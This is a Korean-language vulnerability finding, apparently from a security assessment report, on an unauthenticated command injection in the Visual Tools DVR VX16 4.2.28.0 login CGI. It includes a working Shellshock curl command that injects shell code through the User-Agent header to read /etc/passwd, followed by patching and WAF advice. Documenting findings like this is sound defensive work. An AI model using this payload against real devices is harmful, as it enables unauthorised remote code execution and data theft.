## Visual Tools DVR VX16 4.2.28.0 - Unauthenticated OS Command Injection
- **End-Point**: `http://10.67.139.88/cgi-bin/test.cgi/cgi-bin/slogin/login.py`
- **영향**: 인증되지 않은 원격 코드 실행(RCE)이 가능하며, 대상 시스템의 기밀성, 무결성 및 가용성이 완전히 침해될 수 있음.
- **설명**: Visual Tools DVR VX16 4.2.28.0 버전에서 발생하는 취약점으로, 인증되지 않은 원격 공격자가 HTTP 헤더 등을 통해 OS 명령을 주입하고 실행할 수 있음.
- **근거**: `User-Agent` 헤더에 Shellshock 패턴을 삽입하여 `/etc/passwd` 파일을 탈취하는 다음의 명령으로 재현 가능함. `curl -X 'GET' -d '' -H 'Accept: */*' -H 'Host: 10.67.139.88' -H 'User-Agent: () { :; }; echo ; echo ; /bin/cat /etc/passwd' 'http://10.67.139.88/cgi-bin/test.cgi/cgi-bin/slogin/login.py'`
- **대응**: 제조사에서 제공하는 최신 보안 패치를 적용하여 취약점이 해결된 버전으로 펌웨어를 업데이트해야 함.
- **조치**: 불필요한 외부 노출을 차단하고, 웹 방화벽(WAF)을 통해 `User-Agent` 등 헤더에 포함된 비정상적인 쉘 명령 패턴을 탐지 및 차단함.
